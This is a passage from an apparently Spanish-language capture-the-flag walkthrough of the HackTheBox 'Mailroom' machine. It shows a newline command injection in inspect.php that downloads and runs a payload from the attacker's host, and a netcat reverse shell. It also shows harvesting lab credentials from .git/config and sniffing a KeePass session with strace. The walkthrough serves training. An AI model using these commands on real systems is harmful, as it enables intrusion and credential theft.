+tristan@mailroom:~<span class="nv">$ </span><span class="nb">cat</span> /etc/systemd/system/docker-compose-app.service
+<span class="o">[</span>Unit]
+<span class="nv">Description</span><span class="o">=</span>Docker Compose Application Service
+<span class="nv">Requires</span><span class="o">=</span>docker.service
+<span class="nv">After</span><span class="o">=</span>docker.service
+
+<span class="o">[</span>Service]
+<span class="nv">Type</span><span class="o">=</span>oneshot
+<span class="nv">RemainAfterExit</span><span class="o">=</span><span class="nb">yes
+</span><span class="nv">WorkingDirectory</span><span class="o">=</span>/root/containers
+<span class="nv">ExecStart</span><span class="o">=</span>/usr/bin/docker-compose up <span class="nt">-d</span>
+<span class="nv">ExecStop</span><span class="o">=</span>/usr/bin/docker-compose down
+<span class="nv">TimeoutStartSec</span><span class="o">=</span>0
+
+<span class="o">[</span>Install]
+<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">docker.service</code></p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">● docker.service - Docker Application Container Engine
+     Loaded: loaded <span class="o">(</span>/lib/systemd/system/docker.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
+     Active: active <span class="o">(</span>running<span class="o">)</span> since Sun 2023-08-13 23:31:28 UTC<span class="p">;</span> 2h 38min ago
+TriggeredBy: ● docker.socket
+       Docs: https://docs.docker.com
+   Main PID: 1154
+      Tasks: 26
+     Memory: 108.2M
+     CGroup: /system.slice/docker.service
+             ├─1154 /usr/bin/dockerd <span class="nt">-H</span> fd:// <span class="nt">--containerd</span><span class="o">=</span>/run/containerd/containerd.sock
+             ├─2049 /usr/bin/docker-proxy <span class="nt">-proto</span> tcp <span class="nt">-host-ip</span> 0.0.0.0 <span class="nt">-host-port</span> 80 <span class="nt">-container-ip</span> 172.19.0.5 <span class="nt">-container-port</span> 80
+             └─2058 /usr/bin/docker-proxy <span class="nt">-proto</span> tcp <span class="nt">-host-ip</span> :: <span class="nt">-host-port</span> 80 <span class="nt">-container-ip</span> 172.19.0.5 <span class="nt">-container-port</span> 80</code></pre></figure>
+
+<p>El contenedor tiene la ip <code class="language-plaintext highlighter-rouge">172.19.0.5</code></p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">tristan@mailroom:~<span class="nv">$ </span>curl <span class="nt">--url</span> http://172.19.0.5 <span class="nt">--head</span>
+HTTP/1.1 200 OK
+Date: Mon, 14 Aug 2023 02:12:20 GMT
+Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+X-Powered-By: PHP/7.4.33
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8</code></pre></figure>
+
+<p>Realizamos port forwarding y nos autenticamos en staff-review-panel.mailroom.htb con el token.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → sshpass <span class="nt">-p</span> <span class="s1">'69trisRulez!'</span> ssh tristan@mailroom.htb <span class="nt">-L</span> 8000:172.19.0.5:80</code></pre></figure>
+
+<p>Hay que modificar <code class="language-plaintext highlighter-rouge">/etc/hosts</code> a <code class="language-plaintext highlighter-rouge">127.0.0.1 staff-review-panel.mailroom.htb</code>.</p>
+
+<p>Visitar <code class="language-plaintext highlighter-rouge">staff-review-panel.mailroom.htb</code> nos devuelve.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/staff-web.png" alt="staff-web" /></p>
+
+<p>Aqui se gestiona los mensajes que enviamos anteriormente.</p>
+
+<p>Enviar nuevamente un mensaje y copiar el identificador /inquiries/<code class="language-plaintext highlighter-rouge">da264264fd0835053a3f70b86b3b65a4</code>.html y introducirlo aqui devuelve lo que introduccimos.</p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/staff-read.png" alt="staff-read" /></p>
+
+<p>Aqui no funciona el XSS, solo funciona desde <code class="language-plaintext highlighter-rouge">/inquiries/da264264fd0835053a3f70b86b3b65a4.html</code></p>
+
+<p><img src="/assets/hackthebox/img/machines/hard/mailroom/read-xss.png" alt="read-xss" /></p>
+
+<p>Leyendo el codigo de <code class="language-plaintext highlighter-rouge">inspect.php</code>, vemos que podemos abusar de <code class="language-plaintext highlighter-rouge">CLRF</code> y obtener RCE.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'status_id'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$inquiryId</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[\$&lt;&gt;;|&amp;{}\(\)\[\]\'\"]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'status_id'</span><span class="p">]);</span>
+  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"cat /var/www/mailroom/inquiries/</span><span class="nv">$inquiryId</span><span class="s2">.html"</span><span class="p">);</span>
+<span class="p">[</span><span class="mf">...</span><span class="n">cortado</span><span class="mf">...</span><span class="p">]</span></code></pre></figure>
+
+<p>Obtengo shell de esta forma.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → curl <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=dfc6e94fd7a145fe31a4bf1684cc3a15"</span> <span class="nt">--request</span> POST <span class="nt">--data-raw</span> <span class="s2">"status_id=%0Acurl+10.10.14.189:9001+-o+/tmp/l"</span> <span class="nt">--silent</span> <span class="nt">--url</span> http://staff-review-panel.mailroom.htb:8000/inspect.php 1&gt;/dev/null <span class="o">&amp;&amp;</span> curl <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=dfc6e94fd7a145fe31a4bf1684cc3a15"</span> <span class="nt">--request</span> POST <span class="nt">--data-raw</span> <span class="s2">"status_id=%0Ash+/tmp/l"</span> <span class="nt">--url</span> http://staff-review-panel.mailroom.htb:8000/inspect.php <span class="nt">--silent</span> 1&gt;/dev/null</code></pre></figure>
+
+<p>netcat</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → nc <span class="nt">-lnvp</span> 1337                                         
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>                                 
+Ncat: Listening on :::1337                                                   
+Ncat: Listening on 0.0.0.0:1337                                              
+Ncat: Connection from 10.10.11.209.                                          
+Ncat: Connection from 10.10.11.209:53162.                                    
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device  
+bash: no job control <span class="k">in </span>this shell                                           
+www-data@011649ed96da:/var/www/staffroom<span class="nv">$ </span>                                   </code></pre></figure>
+
+<p>shell</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → shell
+2023/08/13 22:40:00 Nueva conexion.</code></pre></figure>
+
+<p>Subimis lse.sh y nos encuentra 2 .git directorios, al hacerle cat al archivo <code class="language-plaintext highlighter-rouge">.git/config</code> encontramos credenciales del usuario matthew.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">www-data@011649ed96da:/var/www<span class="nv">$ </span><span class="nb">cat</span> /var/www/<span class="k">*</span>/.git/config 2&gt;&amp;-
+<span class="nb">cat</span> /var/www/<span class="k">*</span>/.git/config 2&gt;&amp;-
+<span class="o">[</span>core]
+        repositoryformatversion <span class="o">=</span> 0
+        filemode <span class="o">=</span> <span class="nb">true
+        </span>bare <span class="o">=</span> <span class="nb">false
+        </span>logallrefupdates <span class="o">=</span> <span class="nb">true</span>
+<span class="o">[</span>remote <span class="s2">"origin"</span><span class="o">]</span>
+        url <span class="o">=</span> http://matthew:HueLover83%23@gitea:3000/matthew/mailroom.git
+        fetch <span class="o">=</span> +refs/heads/<span class="k">*</span>:refs/remotes/origin/<span class="k">*</span>
+<span class="o">[</span>branch <span class="s2">"main"</span><span class="o">]</span>
+        remote <span class="o">=</span> origin
+        merge <span class="o">=</span> refs/heads/main
+<span class="o">[</span>user]
+        email <span class="o">=</span> matthew@mailroom.htb
+<span class="o">[</span>core]
+        repositoryformatversion <span class="o">=</span> 0
+        filemode <span class="o">=</span> <span class="nb">true
+        </span>bare <span class="o">=</span> <span class="nb">false
+        </span>logallrefupdates <span class="o">=</span> <span class="nb">true</span>
+<span class="o">[</span>remote <span class="s2">"origin"</span><span class="o">]</span>
+        url <span class="o">=</span> http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
+        fetch <span class="o">=</span> +refs/heads/<span class="k">*</span>:refs/remotes/origin/<span class="k">*</span>
+<span class="o">[</span>branch <span class="s2">"main"</span><span class="o">]</span>
+        remote <span class="o">=</span> origin
+        merge <span class="o">=</span> refs/heads/main
+<span class="o">[</span>user]
+        email <span class="o">=</span> matthew@mailroom.htb</code></pre></figure>
+
+<p>Iniciar sesion en  <code class="language-plaintext highlighter-rouge">git.mailroom.htb</code> nos devuelve el mismo codigo de estado 500.</p>
+
+<p>No funcionan en ssh.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">λ ubuntu-pc Mailroom → sshpass <span class="nt">-p</span> <span class="s1">'HueLover83#'</span> ssh matthew@10.10.11.209
+matthew@10.10.11.209: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.</code></pre></figure>
+
+<p>Desde la sesion de tristan si funciona.</p>
+
+<p>Y obtenemos user.txt</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">tristan@mailroom:~<span class="nv">$ </span>su <span class="nt">--login</span> matthew
+Password: HueLover83#
+matthew@mailroom:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+c2c1e4eb34b133fcec835f912725cdee</code></pre></figure>
+
+<p>Subiendo pspy y ejecutandolo vemos que nuestro usuario ejecuta <code class="language-plaintext highlighter-rouge">/usr/bin/perl /usr/bin/kpcli</code>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">2023/08/14 02:56:47 CMD: <span class="nv">UID</span><span class="o">=</span>1001  <span class="nv">PID</span><span class="o">=</span>32750  | ./pspy
+2023/08/14 02:56:47 CMD: <span class="nv">UID</span><span class="o">=</span>1001  <span class="nv">PID</span><span class="o">=</span>32737  | /usr/bin/perl /usr/bin/kpcli
+2023/08/14 02:56:47 CMD: <span class="nv">UID</span><span class="o">=</span>1001  <span class="nv">PID</span><span class="o">=</span>32731  | /lib/systemd/systemd <span class="nt">--user</span>
+2023/08/14 02:56:47 CMD: <span class="nv">UID</span><span class="o">=</span>1001  <span class="nv">PID</span><span class="o">=</span>32101  | <span class="nt">-bash</span></code></pre></figure>
+
+<p>Leamos el historial.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> .kpcli-history
+lrwxrwxrwx 1 root root 9 Jan 15  2023 .kpcli-history -&gt; /dev/null
+matthew@mailroom:~<span class="nv">$ </span><span class="nb">unlink</span> .kpcli-history</code></pre></figure>
+
+<p>Esperamos y leemos.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span><span class="nb">cat</span> .kpcli-history
+open /home/matthew/personal.kdbx
+<span class="nb">ls </span>Root/
+show <span class="nt">-f</span> 0
+open /home/matthew/personal.kdbx
+<span class="nb">ls </span>Root/
+show <span class="nt">-f</span> 0</code></pre></figure>
+
+<p>Buscando informacion acerca de ese proceso, pero encontramos un archivo inusual <code class="language-plaintext highlighter-rouge">_usr_bin_strace.1001.crash</code>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span>crontab <span class="nt">-l</span>
+no crontab <span class="k">for </span>matthew
+matthew@mailroom:~<span class="nv">$ </span>find / <span class="nt">-user</span> matthew <span class="nt">-or</span> <span class="nt">-group</span> matthew 2&gt;&amp;- | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"/proc|/dev|/sys|/var/run|/run"</span>
+/home/matthew
+/home/matthew/personal.kdbx.lock
+/home/matthew/.cache
+/home/matthew/.cache/motd.legal-displayed
+/home/matthew/.bash_logout
+/home/matthew/user.txt
+/home/matthew/.bash_history
+/home/matthew/pspy
+/home/matthew/.bashrc
+/home/matthew/.kpcli-history
+/home/matthew/.profile
+/home/matthew/.viminfo
+/home/matthew/personal.kdbx
+/var/crash/_usr_bin_strace.1001.crash</code></pre></figure>
+
+<p>Viendo la fecha, este archivo no fue creado por algun usuario, porque existe desde el 16 de marzo del año 2023, debe ser una pista.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">--full-time</span> /var/crash/_usr_bin_strace.1001.crash
+<span class="nt">-rw-r-----</span> 1 matthew matthew 164238 2023-03-16 22:54:52.438647278 +0000 /var/crash/_usr_bin_strace.1001.crash
+matthew@mailroom:~<span class="nv">$ </span><span class="nb">date
+</span>Mon 14 Aug 2023 03:06:48 AM UTC
+matthew@mailroom:~<span class="nv">$ </span><span class="nb">uptime
+</span>03:06:50 up  3:35,  1 user,  load average: 0.00, 0.03, 0.02</code></pre></figure>
+
+<p>Alguien se autentica con mi usuario usando su y ejecuta kpcli.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">2023/08/14 03:09:31 FS:                 OPEN | /usr/bin/su
+2023/08/14 03:09:31 FS:               ACCESS | /usr/bin/su
+2023/08/14 03:09:31 FS:               ACCESS | /usr/bin/su
+2023/08/14 03:09:31 FS:               ACCESS | /usr/bin/su</code></pre></figure>
+
+<h4 id="roottxt">Root.txt</h4>
+
+<p>Con strace podemos hacer un seguimiento de las llamadas al sistema que utiliza el proceso kpcli.</p>
+
+<p>Usando <code class="language-plaintext highlighter-rouge">strace  -p $(pidof perl)</code>, nos muestra mucha basura.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span>strace  <span class="nt">-p</span> <span class="si">$(</span>pidof perl<span class="si">)</span>
+strace: Process 35467 attached
+pselect6<span class="o">(</span>4, <span class="o">[</span>3], NULL, NULL, NULL, <span class="o">{[]</span>, 8<span class="o">})</span> <span class="o">=</span> 1 <span class="o">(</span><span class="k">in</span> <span class="o">[</span>3]<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"x"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="k">select</span><span class="o">(</span>4, <span class="o">[</span>3], NULL, <span class="o">[</span>3], <span class="o">{</span><span class="nv">tv_sec</span><span class="o">=</span>0, <span class="nv">tv_usec</span><span class="o">=</span>0<span class="o">})</span> <span class="o">=</span> 0 <span class="o">(</span>Timeout<span class="o">)</span>
+write<span class="o">(</span>4, <span class="s2">"x"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+pselect6<span class="o">(</span>4, <span class="o">[</span>3], NULL, NULL, NULL, <span class="o">{[]</span>, 8<span class="o">})</span> <span class="o">=</span> 1 <span class="o">(</span><span class="k">in</span> <span class="o">[</span>3]<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+ioctl<span class="o">(</span>3, TCGETS, <span class="o">{</span>B38400 opost isig <span class="nt">-icanon</span> <span class="nt">-echo</span> ...<span class="o">})</span> <span class="o">=</span> 0
+ioctl<span class="o">(</span>3, SNDCTL_TMR_STOP or TCSETSW, <span class="o">{</span>B38400 opost isig icanon <span class="nb">echo</span> ...<span class="o">})</span> <span class="o">=</span> 0
+ioctl<span class="o">(</span>3, TCGETS, <span class="o">{</span>B38400 opost isig icanon <span class="nb">echo</span> ...<span class="o">})</span> <span class="o">=</span> 0</code></pre></figure>
+
+<p>Lo interesante es ver solo lo que escribe con <code class="language-plaintext highlighter-rouge">strace -e trace=write  -p $(pidof perl)</code>.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span>strace <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span>write  <span class="nt">-p</span> <span class="si">$(</span>pidof perl<span class="si">)</span>
+strace: Process 35535 attached
+Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
+matthew@mailroom:~<span class="nv">$ </span>strace <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span>write  <span class="nt">-p</span> <span class="si">$(</span>pidof perl<span class="si">)</span>
+strace: Process 47381 attached
+<span class="nt">---</span> SIGCHLD <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGCHLD, <span class="nv">si_code</span><span class="o">=</span>CLD_EXITED, <span class="nv">si_pid</span><span class="o">=</span>47393, <span class="nv">si_uid</span><span class="o">=</span>1001, <span class="nv">si_status</span><span class="o">=</span>1, <span class="nv">si_utime</span><span class="o">=</span>0, <span class="nv">si_stime</span><span class="o">=</span>0<span class="o">}</span> <span class="nt">---</span>
+write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">KeePass CLI (kpcli) v3.1 is rea"</span>..., 161<span class="o">)</span> <span class="o">=</span> 161
+write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"kpcli:/&gt; "</span>, 9<span class="o">)</span>                <span class="o">=</span> 9
+Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
+strace: Process 47381 attached
+write<span class="o">(</span>4, <span class="s2">"p"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"e"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"n"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">" "</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"/"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"h"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"o"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"m"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"e"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"/"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"m"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"a"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"t"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"t"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"h"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"e"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"w"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"/"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"p"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"e"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"r"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"s"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"o"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"n"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"a"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"l"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"."</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"k"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"d"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"b"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"x"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"Please provide the master passwo"</span>..., 36<span class="o">)</span> <span class="o">=</span> 36
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\1</span><span class="s2">0 </span><span class="se">\1</span><span class="s2">0"</span>, 3<span class="o">)</span>                  <span class="o">=</span> 3
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"*********"</span>, 9<span class="o">)</span>                <span class="o">=</span> 9
+write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"kpcli:/&gt; "</span>, 9<span class="o">)</span>                <span class="o">=</span> 9
+write<span class="o">(</span>4, <span class="s2">"l"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"s"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">" "</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"R"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"o"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"o"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"t"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"/"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"=== Entries ===</span><span class="se">\n</span><span class="s2">"</span>, 16<span class="o">)</span>       <span class="o">=</span> 16
+write<span class="o">(</span>1, <span class="s2">"0. food account                 "</span>..., 375<span class="o">)</span> <span class="o">=</span> 375
+write<span class="o">(</span>4, <span class="s2">"kpcli:/&gt; "</span>, 9<span class="o">)</span>                <span class="o">=</span> 9
+write<span class="o">(</span>4, <span class="s2">"s"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"h"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"o"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"w"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">" "</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"-"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"f"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">" "</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"0"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>1, <span class="s2">"Title: food account</span><span class="se">\n</span><span class="s2">Uname: matth"</span>..., 120<span class="o">)</span> <span class="o">=</span> 120
+write<span class="o">(</span>1, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"kpcli:/&gt; "</span>, 9<span class="o">)</span>                <span class="o">=</span> 9
+write<span class="o">(</span>4, <span class="s2">"q"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"u"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"i"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"t"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+write<span class="o">(</span>4, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                       <span class="o">=</span> 1
+write<span class="o">(</span>6, <span class="s2">"open /home/matthew/personal.kdbx"</span>..., 2723<span class="o">)</span> <span class="o">=</span> 2723
++++ exited with 0 +++</code></pre></figure>
+
+<p>No logra imprimir la master password.</p>
+
+<p>Veamos que lee usando <code class="language-plaintext highlighter-rouge">strace -e trace=read  -p $(pidof perl)</code></p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span>strace <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span><span class="nb">read</span>  <span class="nt">-p</span> <span class="si">$(</span>pidof perl<span class="si">)</span>
+strace: Process 51144 attached
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"e"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"n"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">" "</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"/"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"h"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"o"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"m"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"e"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"/"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"m"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
